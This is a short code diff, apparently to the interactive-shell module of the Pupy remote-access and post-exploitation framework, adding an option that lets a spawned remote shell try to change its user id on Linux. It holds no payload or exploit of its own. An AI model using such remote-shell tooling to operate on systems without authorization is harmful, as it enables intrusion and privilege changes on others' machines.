@@ -109,6 +109,7 @@ class InteractiveShell(PupyModule):
     def init_argparse(self):
         self.arg_parser = PupyArgumentParser(description=self.__doc__)
         self.arg_parser.add_argument('-T', action='store_true', dest='pseudo_tty', help="Disable tty allocation")
+        self.arg_parser.add_argument('-S', '--su', help='Try to change uid (linux only)')
         self.arg_parser.add_argument('-R', default='ttyrec', dest='recorder',
                                          choices=['ttyrec', 'asciinema', 'none'],
                                          help="Change tty recorder")
@@ -262,7 +263,7 @@ class InteractiveShell(PupyModule):
         try:
             term = os.environ.get('TERM', 'xterm')
 
-            ps.spawn(program, term=term)
+            ps.spawn(program, term=term, suid=args.su)
 
             self.set_pty_size=rpyc.async(ps.set_pty_size)
             old_handler = pupylib.PupySignalHandler.set_signal_winch(self._signal_winch)
